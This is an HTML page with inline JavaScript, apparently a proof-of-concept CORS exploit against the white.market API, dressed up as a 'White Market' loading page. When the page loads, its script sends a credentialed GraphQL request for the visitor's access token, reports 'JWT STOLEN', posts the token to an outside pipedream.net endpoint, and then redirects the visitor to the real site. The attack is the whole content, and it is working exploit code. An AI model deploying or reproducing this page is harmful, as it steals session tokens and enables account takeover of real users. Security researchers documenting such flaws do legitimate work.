<!DOCTYPE html>
<html>
<head><title>White Market</title></head>
<body>
<h1>Loading...</h1>
<pre id="output"></pre>

<script>
const output = document.getElementById('output');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

output.textContent = 'Sending CORS request to steal JWT...\n\n';

fetch('https://api.white.market/graphql/api', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'x-accept-language': 'en_US'
    },
    body: JSON.stringify({
        query: "\n  mutation AuthToken {\n    auth_token {\n      accessToken\n    }\n  }\n",
        operationName: "AuthToken"
    })
})
.then(r => {
    output.textContent += `Response status: ${r.status}\n\n`;
    return r.json();
})
.then(data => {
    output.textContent += `Response:\n${JSON.stringify(data, null, 2)}\n\n`;
    
    if (data.data && data.data.auth_token) {
        output.textContent += '✅ SUCCESS - JWT STOLEN!\n\n';
        output.textContent += `JWT:\n${data.data.auth_token.accessToken}\n\n`;
        
        // Exfiltrate
        fetch(REQUESTBIN, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                attack: 'JWT_STOLEN',
                jwt: data.data.auth_token.accessToken,
                timestamp: new Date().toISOString()
            })
        });
        
        output.textContent += '✅ Sent to RequestBin\n';
        
    } else if (data.errors) {
        output.textContent += '❌ Error:\n';
        data.errors.forEach(err => {
            output.textContent += `  ${err.message}\n`;
        });
    }
    
    setTimeout(() => {
        window.location.href = 'https://white.market';
    }, 3000);
})
.catch(e => {
    output.textContent += `❌ Request failed: ${e.message}\n`;
});
</script>
</body>
</html>
